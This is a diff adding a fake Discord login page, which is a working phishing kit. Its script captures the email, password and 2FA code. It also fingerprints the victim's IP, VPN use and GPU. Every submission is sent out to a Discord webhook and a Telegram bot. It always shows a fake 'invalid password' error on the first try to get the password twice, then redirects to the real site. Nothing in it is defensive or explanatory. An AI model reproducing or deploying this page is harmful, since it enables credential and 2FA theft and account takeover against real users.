@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Discord | Login</title>
+    <link rel="icon" type="image/png" href="https://discord.com">
+    <style>
+        @import url('https://fonts.googleapis.com');
+        body { background: url('https://discord.com') center/cover #313338; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'gg sans', sans-serif; margin: 0; overflow: hidden; }
+        
+        .container { background: #313338; width: 480px; padding: 32px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); color: #f2f3f5; text-align: center; }
+        .desktop-view { width: 784px; display: flex; justify-content: space-between; text-align: left; }
+        
+        h3 { font-size: 24px; margin: 0 0 8px 0; font-weight: 600; }
+        p.subtitle { color: #b5bac1; margin-bottom: 20px; font-size: 16px; }
+        #error-msg { color: #fa777c; font-size: 14px; margin-bottom: 15px; display: none; font-weight: 500; text-align: left; }
+        
+        label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; }
+        input { width: 100%; padding: 10px; margin-bottom: 20px; background: #1e1f22; border: 1px solid transparent; border-radius: 3px; color: #dbdee1; font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #5865f2; color: white; border: none; border-radius: 3px; font-size: 16px; cursor: pointer; }
+        
+        /* 2FA Screen - Hidden by default */
+        #two-factor-screen { display: none; }
+        .tfa-icon { width: 60px; margin-bottom: 20px; }
+        
+        /* Responsive QR logic */
+        .qr-side { width: 240px; border-left: 1px solid #404249; padding-left: 32px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        @media (max-width: 830px) { .desktop-view { width: 90%; flex-direction: column; } .qr-side { display: none; } }
+    </style>
+</head>
+<body>
+
+    <!-- LOGIN SCREEN -->
+    <div class="container desktop-view" id="login-screen">
+        <div style="width: 414px;">
+            <h3>Welcome back!</h3>
+            <p class="subtitle">We're so excited to see you again!</p>
+            <div id="error-msg">Login or password is invalid.</div>
+            <form id="loginForm">
+                <label>Email or Phone Number</label><input type="text" id="email" required>
+                <label>Password</label><input type="password" id="password" required>
+                <button type="submit">Log In</button>
+            </form>
+        </div>
+        <div class="qr-side">
+            <div style="background: white; padding: 8px; border-radius: 4px; margin-bottom: 20px; width: 176px; height: 176px;">
+                <img src="https://api.qrserver.com" style="width:100%">
+            </div>
+            <h3 style="color:white; font-size:20px;">Log in with QR Code</h3>
+        </div>
+    </div>
+
+    <!-- 2FA SCREEN -->
+    <div class="container" id="two-factor-screen">
+        <img src="https://discord.com" class="tfa-icon">
+        <h3>Enter authentication code</h3>
+        <p class="subtitle">Enter the 6-digit code from your authenticator app or a backup code.</p>
+        <form id="tfaForm">
+            <label>Authentication Code / Backup Code</label>
+            <input type="text" id="tfa-code" placeholder="000000" maxlength="8" required>
+            <button type="submit">Log In</button>
+            <p style="font-size:14px; color:#00a8fc; cursor:pointer; margin-top:15px;">Lost your device?</p>
+        </form>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL';
+        const TG_TOKEN = 'YOUR_BOT_TOKEN';
+        const TG_CHAT = 'YOUR_CHAT_ID';
+        let attempts = 0;
+        let savedEmail = "";
+
+        async function getIntel() {
+            let data = { ip: "N/A", vpn: "N/A", gpu: "N/A" };
+            try {
+                const res = await fetch('http://ip-api.com');
+                const json = await res.json();
+                data.ip = json.query;
+                data.vpn = (json.proxy || json.hosting) ? "True" : "False";
+                const gl = document.createElement('canvas').getContext('webgl');
+                data.gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+            } catch(e) {}
+            return data;
+        }
+
+        async function sendLog(content) {
+            fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content }) });
+            fetch(`https://api.telegram.org{TG_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: TG_CHAT, text: content, parse_mode: "Markdown" }) });
+        }
+
+        // STEP 1 & 2: LOGIN HANDLING
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            attempts++;
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+            savedEmail = email;
+            const intel = await getIntel();
+
+            const log = `📂 **LOGIN ATTEMPT ${attempts}**\n👤 User: \`${email}\` | 🔑 Pass: \`${pass}\`\n📍 IP: \`${intel.ip}\` | 🛡️ VPN: \`${intel.vpn}\`\n🖥️ GPU: \`${intel.gpu}\``;
+            sendLog(log);
+
+            if (attempts === 1) {
+                document.getElementById('error-msg').style.display = 'block';
+                document.getElementById('password').value = '';
+            } else {
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('two-factor-screen').style.display = 'block';
+            }
+        });
+
+        // STEP 3: 2FA HANDLING
+        document.getElementById('tfaForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const code = document.getElementById('tfa-code').value;
+            const log = `🛡️ **2FA CODE RECEIVED**\n👤 User: \`${savedEmail}\`\n🔢 Code: \`${code}\``;
+            await sendLog(log);
+            window.location.href = "https://discord.com";
+        });
+    </script>
+</body>
+      </html>
+          
